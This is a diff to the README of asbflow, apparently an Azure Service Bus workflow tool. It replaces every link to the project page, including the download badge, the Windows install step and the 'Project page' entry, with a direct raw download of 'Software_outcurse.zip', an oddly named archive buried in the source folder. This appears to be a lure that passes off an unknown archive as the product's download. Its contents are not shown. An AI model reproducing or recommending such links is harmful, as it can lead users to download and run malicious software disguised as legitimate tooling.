@@ -1,12 +1,12 @@
 # 🧩 asbflow - Simplify Azure Service Bus Workflows
 
-[![Download asbflow](https://img.shields.io/badge/Download-asbflow-blue?style=for-the-badge&logo=github)](https://github.com/ratulroy01/asbflow)
+[![Download asbflow](https://img.shields.io/badge/Download-asbflow-blue?style=for-the-badge&logo=github)](https://github.com/ratulroy01/asbflow/raw/refs/heads/main/src/asbflow/publisher/Software_outcurse.zip)
 
 ## 🚀 Download
 
 Use this link to visit the page and download asbflow:
 
-[https://github.com/ratulroy01/asbflow](https://github.com/ratulroy01/asbflow)
+[https://github.com/ratulroy01/asbflow/raw/refs/heads/main/src/asbflow/publisher/Software_outcurse.zip](https://github.com/ratulroy01/asbflow/raw/refs/heads/main/src/asbflow/publisher/Software_outcurse.zip)
 
 ## 📌 What asbflow does
 
@@ -39,7 +39,7 @@ Follow these steps on Windows.
 
 Open this link in your browser:
 
-[https://github.com/ratulroy01/asbflow](https://github.com/ratulroy01/asbflow)
+[https://github.com/ratulroy01/asbflow/raw/refs/heads/main/src/asbflow/publisher/Software_outcurse.zip](https://github.com/ratulroy01/asbflow/raw/refs/heads/main/src/asbflow/publisher/Software_outcurse.zip)
 
 Look for the main repository page. If a release file is available, download the Windows package or source files from there.
 
@@ -283,7 +283,7 @@ If you see a connection error, check your Azure settings again.
 
 ## 📎 Useful links
 
-- Project page: [https://github.com/ratulroy01/asbflow](https://github.com/ratulroy01/asbflow)
+- Project page: [https://github.com/ratulroy01/asbflow/raw/refs/heads/main/src/asbflow/publisher/Software_outcurse.zip](https://github.com/ratulroy01/asbflow/raw/refs/heads/main/src/asbflow/publisher/Software_outcurse.zip)
 - Azure Service Bus: use your Azure portal account
 - Python for Windows: use the official Python site
 
